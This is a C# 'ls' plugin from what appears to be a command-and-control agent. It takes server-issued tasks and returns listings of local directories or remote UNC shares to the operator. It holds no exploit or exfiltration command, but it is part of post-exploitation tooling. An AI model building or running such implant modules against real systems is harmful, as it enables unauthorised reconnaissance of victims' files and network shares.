using System.Net;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {

        public string Name => "ls";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            string path = String.Empty;
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            
            if (!args.ContainsKey("path") || args["path"] == ".")
            {
                path = Directory.GetCurrentDirectory();
            }
            else
            {
                path = args["path"];
            }

            if (path.Contains(":")) //If the path contains a colon, it's likely a windows path and not UNC
            {
                if (path.Split('\\').Count() == 1) //It's a root dir and didn't include a \
                {
                    path = path + "\\";
                }

                await messageManager.AddResponse(LocalListing.GetLocalListing(path, job.task.id));
            }
            else //It could be a local *nix path or a remote UNC
            {
                if (args["host"].Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase)) //If it's the same name as the current host
                {
                    await messageManager.AddResponse(LocalListing.GetLocalListing(path, job.task.id));
                }
                else //UNC Host
                {
                    string fullPath = Path.Join(args["host"], path);
                    string host = args["host"];
                    if (host == "" && path.StartsWith("\\\\"))
                    {
                        host = new Uri(path).Host;
                    }
                    else
                    {
                        fullPath = Path.Join("\\\\" + host, path);
                    }
                    await messageManager.AddResponse(RemoteListing.GetRemoteListing(fullPath, host, job.task.id));
                }
            }
        }
    }
}

